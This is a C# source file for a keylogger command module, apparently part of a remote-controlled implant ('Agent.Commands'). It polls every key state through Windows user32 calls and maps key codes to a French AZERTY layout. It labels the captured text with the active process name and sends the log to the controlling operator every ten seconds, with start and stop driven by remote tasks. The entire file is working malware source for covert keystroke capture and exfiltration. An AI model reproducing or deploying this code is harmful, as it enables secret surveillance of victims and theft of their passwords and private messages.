﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using Agent.Models;
using System.Diagnostics;

namespace Agent.Commands
{
    public class KeyLoggerCommand : AgentCommand
    {
        object __lockObj = new object();
        private bool isRunning;
        public override string Name => "keylog";

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            if (task.SplittedArgs.Length > 0 && task.SplittedArgs[0] == "stop")
            {
                lock (__lockObj)
                {
                    if (isRunning)
                    {
                        isRunning = false;
                    }
                    else
                    {
                        context.Result.Result = "KeyLogger is not running!";
                    }
                }
                return;
            }

            lock (__lockObj)
            {
                if (isRunning)
                {
                    context.Result.Result = "KeyLogger is already running!";
                    return;
                }
                else
                    isRunning = true;
            }


            Stopwatch watch = new Stopwatch();
            watch.Start();
            string activeProcessName = GetActiveWindowProcessName().ToLower();
            string prevProcessName = activeProcessName;

            context.Result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";

            while (true)
            {
                lock (__lockObj)
                {
                    if (!isRunning)
                        break;
                }
                Thread.Sleep(5);

                if (watch.ElapsedMilliseconds >= 10000)
                {
                    watch.Reset();
                    context.MessageService.SendResult(context.Result);
                    watch.Start();
                }

                activeProcessName = GetActiveWindowProcessName().ToLower();
                bool isOldProcess = activeProcessName.Equals(prevProcessName);
                if (!isOldProcess)
                {
                    context.Result.Result += Environment.NewLine + "[--" + activeProcessName + "--]";
                    prevProcessName = activeProcessName;
                }


                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    //if (key != 0)
                    //    Debug.WriteLine($"{i} : {key}");
                    if (key == 32769)
                    {
                        var keyStr = verifyKey(i);
                        //Debug.WriteLine($"Pressed {i} : {keyStr}");
                        context.Result.Result += keyStr;
                    }
                }

            }
        }

        public static string GetActiveWindowProcessName()
        {
            try
            {
                IntPtr windowHandle = GetForegroundWindow();
                GetWindowThreadProcessId(windowHandle, out uint processId);
                Process process = Process.GetProcessById((int)processId);

                return process.ProcessName;
            }
            catch
            {
                return "Unknown";
            }
        }

        private String verifyKey(int code)
        {
            String key = "";

            if (code < 8) key = "";
            else if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 10) key = "";
            else if (code == 11) key = "";
            else if (code == 12) key = "";
            else if (code == 13) key = "[Enter]";
            else if (code == 14) key = "";
            else if (code == 15) key = "";
            else if (code == 16) key = "";
            else if (code == 17) key = "";
            else if (code == 18) key = "";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = " ";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "[Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "à";
            else if (code == 49) key = "&";
            else if (code == 50) key = "é";
            else if (code == 51) key = "\"";
            else if (code == 52) key = "'";
            else if (code == 53) key = "(";
            else if (code == 54) key = "-";
            else if (code == 55) key = "è";
            else if (code == 56) key = "_";
            else if (code == 57) key = "ç";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 186) key = "$";
            else if (code == 187) key = "+";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ";";
            else if (code == 191) key = ":";
            else if (code == 192) key = "ù";
            else if (code == 192) key = ":";
            else if (code == 219) key = ")";
            else if (code == 220) key = "*";
            else if (code == 221) key = "^";
            else if (code == 222) key = "²";
            else if (code == 223) key = "!";
            else key = "[" + code + "]";

            return key;
        }
    }
}
